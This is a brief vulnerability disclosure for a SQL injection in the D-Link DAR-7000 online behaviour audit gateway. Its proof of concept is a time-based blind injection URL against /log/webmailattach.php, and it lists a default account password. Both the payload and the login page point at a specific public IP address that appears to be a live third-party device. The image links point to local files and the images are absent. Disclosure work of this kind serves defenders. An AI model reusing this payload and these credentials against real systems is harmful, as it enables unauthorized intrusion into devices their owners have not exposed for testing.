There is a backend SQL injection vulnerability in the D-LINK DAR-7000 series online behavior audit gateway. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official http://www.dlink.com.cn/

version:DAR-7000

See the login page.

https://60.22.74.195:8443/

![image-20230902145448739](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145448739.png)













There is a default account password present： test/admin@123



![image-20230902145527083](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145527083.png)



poc：

url: https://60.22.74.195:8443/log/webmailattach.php?attach1=&attach2=(null)&table_name=tb_admin+where+1=1+and+(select*from(select(sleep(3)))a)%23&mail_file_path=1，



![image-20230902145556131](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145556131.png)